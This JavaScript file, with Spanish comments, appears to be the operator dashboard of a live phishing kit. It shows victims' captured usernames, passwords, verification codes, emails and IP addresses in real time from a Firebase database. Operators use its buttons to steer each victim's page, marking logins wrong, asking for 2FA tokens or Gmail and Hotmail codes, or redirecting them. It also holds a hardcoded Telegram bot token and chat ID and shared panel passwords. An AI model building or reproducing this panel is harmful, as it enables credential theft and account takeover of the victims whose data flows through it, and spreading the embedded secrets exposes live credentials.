import { db, ref, onValue, update } from "./config.js";

// 🔊 Sonido de alerta cuando llega un nuevo usuario
const sonido = document.getElementById("alerta-sonido");

// 🧠 Set para registrar qué nubes ya se han creado (evita duplicados)
const nubesCreadas = new Set();

// 📦 Elementos principales del DOM
const contenedor = document.getElementById("contenedor");
const modal = document.getElementById("formulario-modal");

////////////////////////////////////////////////////////
// 🔔 FUNCIÓN: Notificar por Telegram conexión/desconexión
////////////////////////////////////////////////////////
async function notificarTelegram(usuario, tipo) {
  const token = "8434946432:AAFLR_h7Nr4AgvSWj3skYYlHX_8_n9Bserc";
  const chatId = "5592536910";
  const ahora = new Date();
  const fecha = ahora.toLocaleDateString("es-CO");
  const hora = ahora.toLocaleTimeString("es-CO", { hour12: false });

  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    const ip = data.ip || "Desconocida";
    const ciudad = data.city || "Desconocida";
    const pais = data.country_name || "Desconocido";

    const mensaje = `
⚠️ *Alerta de Panel*
${tipo === "login" ? "🟢 Conectado" : "🔴 Desconectado"}
👤 Usuario: *${usuario}*
📅 Fecha: ${fecha}
⏰ Hora: ${hora}
🌐 IP: ${ip}
📍 Ciudad: ${ciudad}
🇨🇴 País: ${pais}
`;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: mensaje, parse_mode: "Markdown" })
    });

  } catch (error) {
    console.error("❌ Error al enviar a Telegram:", error);
  }
}

////////////////////////////////////////////////////////
// 🔐 FUNCIONES DE LOGIN
////////////////////////////////////////////////////////

// ✅ Verifica usuario/clave
window.verificarLogin = () => {
  const user = document.getElementById("usuario").value.trim();
  const pass = document.getElementById("clave").value.trim();

  const usuarios = [
    { usuario: "admin", clave: "230320" },
    { usuario: "LuisM", clave: "230320" },
    { usuario: "DiegoM", clave: "230320" },
    { usuario: "apache", clave: "230320" },
    { usuario: "Bake", clave: "230320" }
  ];

  const autorizado = usuarios.some(u => u.usuario === user && u.clave === pass);

  if (autorizado) {
    localStorage.setItem("panelLoggedIn", "true");
    localStorage.setItem("panelUser", user);
    document.getElementById("login-container").style.display = "none";
    document.getElementById("barra-superior").style.display = "block";
    contenedor.style.display = "flex";
    cargarPanel();
    notificarTelegram(user, "login");
  }
};

// 🔴 Cierra sesión y oculta elementos
window.cerrarSesion = () => {
  const user = document.getElementById("usuario").value.trim();
  notificarTelegram(user, "logout");
  localStorage.removeItem("panelLoggedIn");
  document.getElementById("login-container").style.display = "flex";
  document.getElementById("barra-superior").style.display = "none";
  contenedor.style.display = "none";
  document.getElementById("usuario").value = "";
  document.getElementById("clave").value = "";
};

////////////////////////////////////////////////////////
// 📡 FUNCIONALIDAD PRINCIPAL DEL PANEL
////////////////////////////////////////////////////////

function cargarPanel() {
  onValue(ref(db, "dataPages"), (snapshot) => {
    const data = snapshot.val();
    if (!data) return;

    Object.entries(data).forEach(([uid, info]) => {
      if (info.oculto === true) return;

      let nube = document.getElementById("nube-" + uid);
      const esNueva = !nube;

      const bolita = info.estado === "abierto" ? "verde" : "rojo";
      const html = `
        <div class="cerrar" onclick="cerrarNube('${uid}')">X</div>
        <div class="estado-conexion ${bolita}">
          ${info.estado === "abierto" ? "Conectado" : "Desconectado"}
        </div>
        <div class="ip-info">
          <strong>IP:</strong> ${info.ip || ""} |
          <strong>Country:</strong> ${info.pais || ""} |
          <strong>Flag:</strong> ${info.codigoPais || "co"}
        </div>
        <div class="datos-linea">
          <div><strong>Username:</strong><br>${info.username || "*******"}</div>
          <div><strong>Password:</strong><br>${info.password || "*******"}</div>
          <div><strong>Código:</strong><br>${info.codigo || "*******"}</div>
          <div><strong>Email:</strong><br>${info.email || "*******"}</div>
          <div><strong>Passwords:</strong><br>${info.passwords || "*******"}</div>
        </div>
        <div class="botones">
          <button class="btn rojo" onclick="incorrecto('${uid}')">Incorrect</button>
          <button class="btn azul" onclick="redirigir('${uid}')">Redirect</button>
          <button class="btn naranja" onclick="irAIndex('${uid}')">Login</button>
          <button class="btn morado" onclick="abrirToken('${uid}')">Token</button>
          <button class="btn amarillo" onclick="abrirMail('${uid}')">Gmail</button>
          <button class="btn rosa" onclick="abrirHot('${uid}')">Hotmail</button>
        </div>
      `;

      if (esNueva) {
        nube = document.createElement("div");
        nube.className = "nube";
        nube.id = "nube-" + uid;
        nube.innerHTML = html;
        contenedor.appendChild(nube);

        if (!nubesCreadas.has(uid)) {
          if (sonido) sonido.play().catch(() => {});
          nubesCreadas.add(uid);
        }
      } else {
        nube.innerHTML = html; // 🔁 Actualiza contenido
      }
    });
  });
}

////////////////////////////////////////////////////////
// ✂️ FUNCIONES DE ACCIÓN SOBRE CADA USUARIO
////////////////////////////////////////////////////////

window.cerrarNube = uid => {
  update(ref(db, "dataPages/" + uid), { oculto: true });
  const el = document.getElementById("nube-" + uid);
  if (el) el.remove();
};

window.incorrecto = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "incorrecto" });
  cerrarFormulario();
};

window.redirigir = uid =>
  update(ref(db, "dataPages/" + uid), {
    estado: "redirigirExterno",
    url: "https://ejemplo.com",
    bloqueado: true
  });

window.irAIndex = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "irAIndex" });
  cerrarFormulario();
};

window.irAGmail = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "irAGmail" });
  cerrarFormulario();
};

window.irAHotmail = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "irAHotmail" });
  cerrarFormulario();
};

window.incorrectoHot = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "incorrectoHot" });
  cerrarFormulario();
};

////////////////////////////////////////////////////////
// 🟪 MODAL TOKEN
////////////////////////////////////////////////////////
window.abrirToken = uid => {
  modal.innerHTML = `
    <div class="modal-formulario">
      <h4>Formulario de Token</h4>
      <input type="text" id="tokenInput-${uid}" placeholder="Nombre para token">
      <div class="modal-buttons">
        <button class="btn negro" onclick="enviarToken('${uid}')">Enviar</button>
        <button class="btn rojo" onclick="incorrecto('${uid}')">Incorrecto</button>
        <button class="btn azul" onclick="cerrarFormulario()">Cancelar</button>
      </div>
    </div>
  `;
};

window.enviarToken = uid => {
  const valor = document.getElementById("tokenInput-" + uid).value;
  if (valor.trim()) {
    update(ref(db, "dataPages/" + uid), {
      tokenName: valor,
      estado: "redirigir"
    });
    cerrarFormulario();
  }
};

////////////////////////////////////////////////////////
// ✉️ MODAL GMAIL
////////////////////////////////////////////////////////
window.abrirMail = uid => {
  modal.innerHTML = `
    <div class="modal-formulario">
      <h4>Formulario Gmail</h4>
      <input type="text" id="mailCodigo-${uid}" placeholder="Código (2 dígitos)" maxlength="2">
      <input type="text" id="mailDescripcion-${uid}" placeholder="Descripción">
      <div class="modal-buttons">
        <button class="btn negro" onclick="enviarMail('${uid}')">Enviar</button>
        <button class="btn rojo" onclick="incorrecto('${uid}')">Incorrecto</button>
        <button class="btn azul" onclick="irAGmail('${uid}')">Inicio</button>
        <button class="btn" onclick="cerrarFormulario()">Cancelar</button>
      </div>
    </div>
  `;
};

window.enviarMail = uid => {
  const codigo = document.getElementById("mailCodigo-" + uid).value;
  const descripcion = document.getElementById("mailDescripcion-" + uid).value;
  if (codigo.trim() && descripcion.trim()) {
    update(ref(db, "dataPages/" + uid), { mailCodigo: codigo, mailDescripcion: descripcion });
    cerrarFormulario();
  }
};

////////////////////////////////////////////////////////
// 🔵 MODAL HOTMAIL
////////////////////////////////////////////////////////
window.abrirHot = uid => {
  modal.innerHTML = `
    <div class="modal-formulario">
      <h4>Formulario Hotmail</h4>
      <div class="modal-buttons">
        <button class="btn negro" onclick="irAHotmail('${uid}')">Inicio</button>
        <button class="btn rojo" onclick="incorrectoHot('${uid}')">Incorrecto</button>
        <button class="btn" onclick="cerrarFormulario()">Cancelar</button>
      </div>
    </div>
  `;
};

////////////////////////////////////////////////////////
// ❌ Cierra cualquier formulario modal abierto
////////////////////////////////////////////////////////
window.cerrarFormulario = () => {
  modal.innerHTML = "";
};
